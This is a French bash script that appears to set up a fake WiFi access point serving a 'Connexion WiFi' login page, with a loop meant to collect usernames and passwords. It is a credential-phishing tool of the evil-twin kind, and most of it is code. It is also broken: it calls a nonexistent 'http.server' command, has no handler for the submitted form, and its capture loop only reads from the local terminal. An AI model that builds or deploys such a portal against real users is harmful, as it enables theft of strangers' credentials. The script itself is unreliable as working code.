#!/bin/bash

# Configuration
INTERFACE="wlan0"
PORT="8080"
PAGE_ACCUEIL="index.html"

# Demande du nom du WiFi
echo "Entrez le nom du WiFi : "
read SSID

# Demande du mot de passe (facultatif)
echo "Entrez le mot de passe (facultatif) : "
read PASSWORD

# Création de la page d'accueil
echo "Création de la page d'accueil..."
cat > $PAGE_ACCUEIL << EOF
<!DOCTYPE html>
<html>
<head>
  <title>Connexion WiFi</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
    }
    .container {
      width: 300px;
      margin: 50px auto;
      padding: 20px;
      background-color: #fff;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .container h1 {
      text-align: center;
    }
    .container form {
      margin-top: 20px;
    }
    .container form input[type="text"] {
      width: 100%;
      height: 40px;
      margin-bottom: 20px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .container form input[type="password"] {
      width: 100%;
      height: 40px;
      margin-bottom: 20px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .container form button[type="submit"] {
      width: 100%;
      height: 40px;
      background-color: #4CAF50;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .container form button[type="submit"]:hover {
      background-color: #3e8e41;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Connexion WiFi</h1>
    <form action="" method="post">
      <input type="text" name="username" placeholder="Nom d'utilisateur">
      <input type="password" name="password" placeholder="Mot de passe">
      <button type="submit">Se connecter</button>
    </form>
  </div>
</body>
</html>
EOF

# Création du réseau WiFi
echo "Création du réseau WiFi..."
ip link set $INTERFACE up
ip addr add 192.168.1.1/24 dev $INTERFACE
ip link set $INTERFACE down
ip link set $INTERFACE up
iwconfig $INTERFACE mode master
iwconfig $INTERFACE essid $SSID
if [ -n "$PASSWORD" ]; then
  iwconfig $INTERFACE key $PASSWORD
fi

# Démarrage du serveur HTTP
echo "Démarrage du serveur HTTP..."
http.server -p $PORT $PAGE_ACCUEIL &

# Envoi des informations de connexion à Termux
echo "Envoi des informations de connexion à Termux..."
while true; do
  read -p "Entrez le nom d'utilisateur et le mot de passe : " username password
  echo "Nom d'utilisateur : $username"
  echo "Mot de passe : $password"
done
